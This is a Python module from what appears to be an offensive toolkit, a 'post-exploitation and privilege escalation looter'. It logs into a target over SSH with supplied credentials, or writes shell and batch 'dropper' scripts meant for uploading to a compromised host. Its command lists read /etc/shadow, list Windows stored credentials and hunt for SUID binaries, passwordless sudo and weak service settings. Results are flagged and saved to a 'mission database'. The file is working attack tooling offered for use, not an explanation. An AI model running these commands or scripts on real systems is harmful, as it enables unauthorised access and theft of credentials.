import os
import time
import questionary
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from core.ui import draw_header, Q_STYLE
from core.database import db

try:
    import paramiko
except ImportError:
    pass

console = Console()

LINUX_CHECKS = {
    "OS Release": "cat /etc/os-release | grep PRETTY_NAME | cut -d '=' -f 2",
    "Current User & Groups": "id",
    "Sudo Permissions (Passwordless)": "sudo -n -l 2>/dev/null",
    "SUID Binaries (Root access)": "find / -perm -u=s -type f 2>/dev/null | grep -v 'snap\|docker' | head -n 15",
    "Readable Shadow File": "ls -l /etc/shadow",
    "Shadow File Content": "cat /etc/shadow 2>/dev/null | head -n 5",
    "Active Cron Jobs": "cat /etc/crontab 2>/dev/null | grep -v '^#'",
}

WINDOWS_CHECKS = {
    "System Info": "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"",
    "Current User Privileges": "whoami /priv",
    "Stored Credentials": "cmdkey /list",
    "AlwaysInstallElevated (Registry)": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
    "Unquoted Service Paths": 'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\" | findstr /i /v """',
}

class LooterEngine:
    def __init__(self):
        self.ssh_client = None

    def connect_ssh(self, target, port, username, password=None, key_path=None):
        try:
            self.ssh_client = paramiko.SSHClient()
            self.ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            with console.status(f"[bold cyan]Establishing secure connection to {target}...[/bold cyan]"):
                if key_path:
                    key = paramiko.RSAKey.from_private_key_file(key_path)
                    self.ssh_client.connect(hostname=target, port=port, username=username, pkey=key, timeout=10)
                else:
                    self.ssh_client.connect(hostname=target, port=port, username=username, password=password, timeout=10)
            return True
        except paramiko.AuthenticationException:
            console.print("[bold red][!] Authentication failed. Check credentials.[/bold red]")
        except Exception as e:
            console.print(f"[bold red][!] Connection failed:[/bold red] {e}")
        return False

    def execute_remote(self, cmd):
        if not self.ssh_client: return "No connection."
        try:
            stdin, stdout, stderr = self.ssh_client.exec_command(cmd, timeout=15)
            output = stdout.read().decode().strip()
            error = stderr.read().decode().strip()
            return output if output else error
        except Exception as e:
            return f"Error executing: {e}"

    def generate_dropper(self):
        console.print("[*] Generating standalone PrivEsc enumeration scripts...")
        os.makedirs("payloads", exist_ok=True)
        
        # Linux Dropper
        lin_path = "payloads/lin_looter.sh"
        with open(lin_path, "w") as f:
            f.write("#!/bin/bash\n")
            f.write("echo '=== DAVOID LINUX LOOTER ==='\n")
            for name, cmd in LINUX_CHECKS.items():
                f.write(f"echo '\n[*] {name}:'\n")
                f.write(f"{cmd}\n")
                
        # Windows Dropper
        win_path = "payloads/win_looter.bat"
        with open(win_path, "w") as f:
            f.write("@echo off\n")
            f.write("echo === DAVOID WINDOWS LOOTER ===\n")
            for name, cmd in WINDOWS_CHECKS.items():
                f.write(f"echo.\necho [*] {name}:\n")
                f.write(f"{cmd}\n")

        console.print(f"[bold green][+] Droppers generated in /opt/davoid/payloads/[/bold green]")
        console.print("[dim]Upload these to your target shell and execute them locally.[/dim]")
        questionary.press_any_key_to_continue(style=Q_STYLE).ask()

    def run_live_loot(self):
        target = questionary.text("Target IP:", style=Q_STYLE).ask()
        port = int(questionary.text("SSH Port:", default="22", style=Q_STYLE).ask())
        username = questionary.text("Username:", style=Q_STYLE).ask()
        
        auth_method = questionary.select("Authentication Method:", choices=["Password", "Private Key"], style=Q_STYLE).ask()
        password = None
        key_path = None
        
        if auth_method == "Password":
            password = questionary.password("Password:", style=Q_STYLE).ask()
        else:
            key_path = questionary.text("Absolute Path to Private Key (e.g. /root/.ssh/id_rsa):", style=Q_STYLE).ask()

        if not self.connect_ssh(target, port, username, password, key_path):
            questionary.press_any_key_to_continue(style=Q_STYLE).ask()
            return

        console.print(f"\n[bold green][+] Connected to {target} as {username}![/bold green]")
        
        # OS Detection
        os_type = self.execute_remote("uname")
        is_linux = "Linux" in os_type or "Darwin" in os_type
        
        checks = LINUX_CHECKS if is_linux else WINDOWS_CHECKS
        os_name = "Linux/Unix" if is_linux else "Windows"
        
        console.print(f"[*] Target identified as: [bold magenta]{os_name}[/bold magenta]")
        console.print("[*] Commencing automated Privilege Escalation enumeration...\n")
        
        table = Table(title=f"PrivEsc Looter Report: {target}", border_style="bold red", expand=True)
        table.add_column("Vector / Check", style="cyan", ratio=1)
        table.add_column("Findings", style="white", ratio=3)
        
        findings_log = []

        with console.status("[bold cyan]Looting target...", spinner="bouncingBar"):
            for name, cmd in checks.items():
                time.sleep(0.5) # Slight delay to avoid crashing unstable shells
                res = self.execute_remote(cmd)
                
                if not res or "command not found" in res.lower():
                    res = "[dim]No results or command unavailable.[/dim]"
                
                # Flag critical findings natively
                severity = "INFO"
                if "NOPASSWD" in res or "SeImpersonatePrivilege" in res or "AlwaysInstallElevated" in res or "root" in res[:10]:
                    res = f"[bold red]CRITICAL FINDING:[/bold red]\n{res}"
                    severity = "CRITICAL"

                # Truncate extremely long outputs for the UI
                ui_res = res if len(res) < 500 else res[:500] + "\n...[truncated]..."
                table.add_row(name, ui_res)
                findings_log.append(f"[{name}]\n{res}")

        self.ssh_client.close()
        console.print(table)
        
        # Log to Database
        db.log("PrivEsc-Looter", target, f"User: {username}\n" + "\n".join(findings_log), "HIGH")
        console.print("[bold green][+] Looter complete. High-value data saved to Mission Database.[/bold green]")
        questionary.press_any_key_to_continue(style=Q_STYLE).ask()

def run_looter():
    draw_header("Post-Exploitation & PrivEsc Looter")
    
    choice = questionary.select(
        "Select Looter Mode:",
        choices=[
            "1. Live SSH Auto-Loot (Requires low-priv credentials)",
            "2. Generate Dropper Scripts (For netcat/MSF shells)",
            "Back"
        ],
        style=Q_STYLE
    ).ask()
    
    engine = LooterEngine()
    
    if "Live" in choice:
        engine.run_live_loot()
    elif "Generate" in choice:
        engine.generate_dropper()

if __name__ == "__main__":
    run_looter()